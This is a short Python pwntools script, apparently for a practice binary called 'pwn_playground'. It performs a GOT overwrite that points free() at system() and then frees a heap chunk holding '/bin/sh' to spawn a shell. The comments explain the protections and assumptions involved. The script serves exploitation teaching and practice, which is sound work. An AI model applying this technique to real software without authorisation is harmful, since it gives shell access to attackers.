#!/bin/env python3
from pwn import *
from pwn_playground_api import *

# simple got overwrite to call system upon a free() with /bin/sh as an argument
# protections of note:
#   PIE disabled
#   partial RELRO
# libc version: 2.30
# important assumptions used:
#   libc leak
#   arbitrary write primitive

# start up the pwn_playground program and get objects for the process, binary ELF and libc ELF
p, elf, libc = init_process()
skip_menu(p)

# assume we get a libc leak use that to calculate the base of libc
set_libc_base(p, libc)

# allocate a new heap chunk and write /bin/sh to it
heap_idx = alloc_heap_chunk(p, 0x20)
write_heap_chunk(p, heap_idx, b"/bin/sh\x00")

# overwrite GOT entry for free with system using an arbitrary write
arb_write_val(p, libc.symbols['system'], elf.got['free'])

# call free-> calls system with a pointer to /bin/sh as an argument
# skip_m is set to false as this will execute a shell
free_heap_chunk(p, heap_idx, skip_m=False)

p.interactive()
